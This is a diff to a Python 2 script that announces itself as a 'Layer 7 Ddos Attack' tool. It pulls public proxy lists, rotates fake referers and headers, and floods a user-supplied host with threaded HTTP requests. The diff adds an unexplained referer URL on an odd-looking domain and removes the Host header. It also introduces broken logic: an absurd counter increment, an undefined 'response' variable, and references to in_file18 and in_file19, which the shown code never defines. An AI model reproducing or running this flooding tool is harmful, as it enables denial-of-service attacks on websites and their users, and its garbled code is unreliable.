@@ -110,6 +110,7 @@ def getUserAgent():
 def referer_list():
     try :
         global headers_referers
+        headers_referers.append('http://e9geolgzk6.com/iuqasfg3?dbqfdh=34&refer=')
         headers_referers.append('https://iplookup.flagfox.net/?host=')
         headers_referers.append("https://foradoar.org/")
         headers_referers.append("https://duckduckgo.com/")
@@ -1316,7 +1317,7 @@ def referer_list():
         headers_referers.append('http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=')
         headers_referers.append('http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
         headers_referers.append('http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=')
-        headers_referers.append('http://' + url_host + '/')
+        headers_referers.append('http://' + url + '/')
         return(headers_referers)
     except MemoryError:
                 print("[Root@Kali://P3terJ4mes>Memory not open specified url.\n")
@@ -1383,7 +1384,6 @@ class Requested(threading.Thread):
 	        request.add_header('Accept-Charset', random.choice(acceptCharset()))
 	        request.add_header('Accept-Encoding', random.choice(acceptEncoding()))
 	        request.add_header('Content-Type',random.choice(contentType()))
-	        request.add_header('Host',url_host)
 	        index_proxy = random.randint(0,len(listaproxy)-1)
                 proxy_server = urllib2.ProxyHandler({'http':listaproxy[index_proxy]})
                 opener = urllib2.build_opener(proxy_server,urllib2.HTTPHandler)
@@ -1391,9 +1391,10 @@ class Requested(threading.Thread):
                 urllib2.urlopen(request)
                 request_counter += 1203
                 Request_counter += 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
-                status = response.status_code
+                urllib2.urlopen(request)
+                status_codes = response.status_code
                 Lock.acquire()
-                print("[Root@Kali://P3terJ4mes>Status Server {}\n").format(status)
+                print("[Root@Kali://P3terJ4mes>Status Server {}\n").format(status_codes)
                 print("[Root@Kali://P3terJ4mes>Layer 7 Attack with Proxy [--{}--]\n ").format(listaproxy[index_proxy])
                 print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(request_counter)
                 print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(Request_counter/5.0)
@@ -1405,7 +1406,7 @@ class Requested(threading.Thread):
                 print("[Root@Kali://P3terJ4mes>URL ERROR\n")
                 sys.exit()
             except httplib.BadStatusLine:
-                print("[Root@Kali://P3terJ4mes>Bad Status Line")
+                print("[Root@Kali://P3terJ4mes>Bad Status Line\n")
             except IOError:
                 print("[Root@Kali://P3terJ4mes>Could not open specified url.\n")
                 sys.exit()
@@ -1423,27 +1424,29 @@ class Requested(threading.Thread):
         
 print \
 """
-         
-        +--------+      HTTP                      :80 +----------+
-        | Client |  --------------------------------> |          |
-        |        |         Layer 7 Requests           | ProxyHTTP|
-        +--------+             +---------+            |==========|
-       / Rquests/     HTTPS    |         | HTTP Ports | Listening|==>HOST
-      <________/    ---------> | (Server | ---------> |  ports   |
-                               |  mode)  |            |          |
-                               +---------+            +----------+
-    !_____________________________________________________________________!
+
+                      PROXY ---------Requests----------||||
+           Computer ========|                           ==> HOST
+          +--------+      HTTP                      :80 +----------+
+          | Client |  --------------------------------> |          |
+          |        |         Layer 7 Requests           | ProxyHTTP|
+          +--------+             +---------+            |==========|
+         /Requests/     HTTPS    |         | HTTPs Ports|__________|
+        <________/    ---------> | (Server | ---------> | Listening|     
+             \\      Status Server|  mode)  |            |          |
+              \\__| ==============|         | <----------| RESPONSE |
+                                 +---------+   Status   +----------+
+    !____________________________________________________________________!
 """
 
-print("   ========>>.:.Hello P3terJ4mes,Welcome Ddos Attack2019 WEBSITE.:.<<========")
+print(" =========>>.:.Hello P3terJ4mes,Welcome Ddos Attack2019 WEBSITE.:.<<=========")
 print("")
-
+print("")
 if os.name in ('nt', 'dos', 'ce'):
     os.system('title       ........::::: Code By Thunder(P3terJ4mes),Layer 7 Ddos Attack :::::........')
     os.system('color 0A')
     
 url = raw_input('[Root@Kali://P3terJ4mes>Host :')
-url_host = url.replace("https://", "").replace("http://", "").replace("www.", "")
 try:
    #The Proxy HTTP_HTTPS_SOCKS4_SOCKS5 Update Every Time in The Site:
    in_file = urllib.urlopen('http://spys.me/proxy.txt')
@@ -1465,12 +1468,11 @@ try:
    in_file14 = urllib.urlopen('http://proxy-ip-list.com/download/proxy-list-port-3128.txt')
    in_file15 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=socks4')
    in_file16 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=socks5')
-   in_file17 = urllib.urlopen('https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt')
    listaproxy0 = in_file.readlines()  + in_file1.readlines()  + in_file2.readlines()  + in_file3.readlines()
    listaproxy1 = in_file4.readlines()  + in_file5.readlines()  + in_file6.readlines()  + in_file7.readlines()
    listaproxy2 = in_file8.readlines()  + in_file9.readlines()  + in_file10.readlines()  + in_file11.readlines()  
    listaproxy3 = in_file12.readlines()  + in_file13.readlines()  + in_file14.readlines()  + in_file15.readlines()  
-   listaproxy4 = in_file16.readlines() + in_file17.readlines() + in_file18.readlines() + in_file19.readlines()
+   listaproxy4 = in_file16.readlines() +  in_file18.readlines() + in_file19.readlines()
    listaproxy = listaproxy0 + listaproxy1 + listaproxy2 + listaproxy3 + listaproxy4
 except IOError:
        print("[Root@Kali://P3terJ4mes>Could not open specified Proxy Url.\n")
